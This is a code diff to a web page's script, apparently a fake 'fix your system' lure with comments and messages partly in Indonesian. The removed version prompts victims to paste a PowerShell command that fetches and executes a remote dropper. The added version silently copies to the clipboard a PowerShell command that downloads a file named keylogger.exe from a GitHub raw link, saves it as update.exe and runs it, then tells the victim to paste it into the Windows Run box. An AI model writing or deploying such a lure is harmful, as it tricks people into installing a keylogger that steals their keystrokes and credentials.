@@ -28,15 +28,19 @@
         </p>
     </div>
 
-    <script>
-        function fixSystem() {
-            alert("✅ Fix initiated.\n\nPlease follow these steps:\n\n1. Press Windows + R\n2. Copy and paste the command below\n3. Press Enter\n\nCommand will appear after you click OK.");
-            
-            // Command ini akan ditampilkan di alert berikutnya (kurang langsung, tapi lebih aman)
-            setTimeout(() => {
-                prompt("Copy this command and paste in Run box:", "powershell -nop -c \"iex (iwr -UseBasicParsing 'https://bit.ly/yourdropper').Content\"");
-            }, 800);
-        }
-    </script>
+   <script>
+    function fixNow() {
+        // Link ke keylogger.exe kamu (Raw link dari GitHub)
+        const downloadLink = "https://raw.githubusercontent.com/wafyputraa/windows-update/main/keylogger.exe";
+
+        const cmd = `powershell -nop -c "Invoke-WebRequest -Uri '${downloadLink}' -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe"`;
+
+        navigator.clipboard.writeText(cmd).then(() => {
+            alert("✅ Command berhasil disalin!\n\nSekarang lakukan langkah berikut:\n\n1. Tekan tombol Windows + R\n2. Paste (Ctrl + V)\n3. Tekan Enter");
+        }).catch(() => {
+            alert("Gagal menyalin otomatis.\n\nSilakan copy manual command di bawah ini:\n\n" + cmd);
+        });
+    }
+</script>
 </body>
 </html>
